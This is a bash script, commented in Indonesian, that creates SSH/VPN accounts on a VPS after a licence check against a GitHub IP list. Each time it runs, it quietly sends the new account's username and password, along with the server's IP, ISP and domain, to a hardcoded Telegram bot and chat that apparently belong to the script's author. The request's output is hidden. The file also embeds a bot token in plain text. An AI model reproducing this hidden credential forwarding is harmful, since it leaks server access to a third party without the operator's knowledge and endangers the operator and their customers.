#!/bin/bash
red='\e[1;31m'
green='\e[0;32m'
purple='\e[0;35m'
blue='\e[0;34m'
yellow='\e[1;33m'
cyan='\e[1;96m'
NC='\e[0m'
# Getting Online Date
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
dateayena=`date +"%Y-%m-%d" -d "$dateFromServer"`
# MYIP IP & GET EXPIRED
MYIP=$(curl -4 -sS ipv4.icanhazip.com)
IZIN=$(curl -4 -sS https://raw.githubusercontent.com/arismaramar/kuprit/main/list.txt | awk '{print $1}' | grep -w $MYIP)
EXP=$(curl -4 -sS https://raw.githubusercontent.com/arismaramar/kuprit/main/list.txt | grep -w $MYIP | awk '{print $2}')
USERVPS=$(curl -4 -sS https://raw.githubusercontent.com/arismaramar/kuprit/main/list.txt | grep -w $MYIP | awk '{print $3}')
# Cek Database
echo "Checking..."
if [[ $MYIP = $IZIN ]]; then
	echo -e "${green}IP Diterima...${NC}"
else
	echo -e "${red}IP Belum Terdaftar!${NC}";
	echo "Hubungi @arismaramar Untuk Daftar Premium"
	exit 0
fi
# Cek Tanggal
d1=(`date -d "$EXP" +%s`)
d2=(`date -d "$dateayena" +%s`)
exp2=$(( (d1 - d2) / 86400 ))
if [[ "$exp2" -le "0" ]]; then
	echo "${red}Masa Aktif Habis ! Silahkan Perpanjang${NC}";
	exit 0
else
	echo -e "${green}Masa Aktif Berjalan${NC}";
fi
clear
# Telegram Stuff
BOT_TOKEN="5705818275:AAF6Uz494dgJ3OyEaxRAfq5AApxyVby3GnM"
CHAT_ID="-1001544942716"
IPADRESS=$( curl -4 -s ipv4.appspot.com)
REGION=$( curl -s https://ipapi.co/${IPADRESS}/country_name/)
ISP=$( curl -s https://ipapi.co/${IPADRESS}/org/)
telegram_curl() {
	local ACTION=${1}
	shift
	local HTTP_REQUEST=${1}
	shift
	if [ "$HTTP_REQUEST" != "POST_FILE" ]; then
			curl -s -X $HTTP_REQUEST "https://api.telegram.org/bot$BOT_TOKEN/$ACTION" "$@" | jq .
	else
			curl -s "https://api.telegram.org/bot$BOT_TOKEN/$ACTION" "$@" | jq .
	fi
}
telegram_main() {
	local ACTION=${1}
	local HTTP_REQUEST=${2}
	local CURL_ARGUMENTS=()
	while [ "${#}" -gt 0 ]; do
		case "${1}" in
			--animation | --audio | --document | --photo | --video )
					local CURL_ARGUMENTS+=(-F $(echo "${1}" | sed 's/--//')=@"${2}")
					shift
					;;
			--* )
					if [ "$HTTP_REQUEST" != "POST_FILE" ]; then
							local CURL_ARGUMENTS+=(-d $(echo "${1}" | sed 's/--//')="${2}")
					else
							local CURL_ARGUMENTS+=(-F $(echo "${1}" | sed 's/--//')="${2}")
					fi
					shift
					;;
		esac
		shift
	done
	telegram_curl "$ACTION" "$HTTP_REQUEST" "${CURL_ARGUMENTS[@]}"
}
tg_send_message() {
	telegram_main sendMessage POST "$@"
}
## End of Telegram Stuff
# ENV
domain=$(cat /etc/adi/domain)
porttls="443"
portnontls="80"
fix=%26
# Get InfoName
read -p "Username : " Login
read -p "Password : " Pass
read -p "Expired (hari): " masaaktif
sleep 1
clear
# Setup Account
useradd -e `date -d "$masaaktif days" +"%Y-%m-%d"` -s /bin/false -M $Login
exp="$(chage -l $Login | grep "Account expires" | awk -F": " '{print $2}')"
echo -e "$Pass\n$Pass\n"|passwd $Login &> /dev/null
# Informasi Telegram
# Post Telegram
if [[ -z $BOT_TOKEN ]]; then
	echo "Terimakasih Telah Menggunakan Layanan NetzXRay Bot"
elif [[ -z $CHAT_ID ]]; then
	echo -e " "
else
tg_send_message --chat_id "$CHAT_ID" --text "*SSH BERHASIL DIBUAT !*
*ISP*   : $ISP
*IP*    : $IPADRESS
*Domain*        : $domain
Username = $Login
Password = $Pass
Masa Aktif = $exp
SSH Dropbear = 143
SSH SSL = 443,445
SSH WS = 80,8880
SSH WS SSL = 443
OPENVPN TCP = 1194
OPENVPN UDP = 2200
OPENVPN SSL = 442
UDPGW = 7300
OVPN TCP = http://$domain:81/openvpn/TCP.ovpn
OVPN UDP = http://$domain:81/openvpn/UDP.ovpn
OVPN SSL = http://$domain:81/openvpn/SSL.ovpn
Payload SSH WS = \`GET / HTTP/1.1[crlf]Host: $domain[crlf]Upgrade: websocket[crlf]Connection: Keep-Alive[crlf][crlf]\`
Payload SSH WS SSL = \`GET wss://bug.com/ [protocol][crlf]Host: $domain[crlf]Upgrade: websocket[crlf]Connection: Keep-Alive[crlf][crlf]\`
AutoScript By Adi Subagja" --parse_mode "Markdown" >/dev/null
echo "Terimakasih Telah Menggunakan Layanan NetzXRay"
fi
# Informasi Akun CLI
echo -e "
Terima Kasih !
Akun SSH Telah Dibuat
IP = $IPADRESS
Domain = $domain
Username = $Login
Password = $Pass
Masa Aktif = $exp
SSH Dropbear = 143
SSH SSL = 443,445
SSH WS = 80,8880
SSH WS SSL = 443
OPENVPN TCP = 1194
OPENVPN UDP = 2200
OPENVPN SSL = 442
UDPGW = 7300
OVPN TCP = http://$domain:81/openvpn/TCP.ovpn
OVPN UDP = http://$domain:81/openvpn/UDP.ovpn
OVPN SSL = http://$domain:81/openvpn/SSL.ovpn
Payload SSH WS = GET / HTTP/1.1[crlf]Host: $domain[crlf]Upgrade: websocket[crlf]Connection: Keep-Alive[crlf][crlf]
Payload SSH WS SSL = GET wss://bug.com/ [protocol][crlf]Host: $domain[crlf]Upgrade: websocket[crlf]Connection: Keep-Alive[crlf][crlf]
"
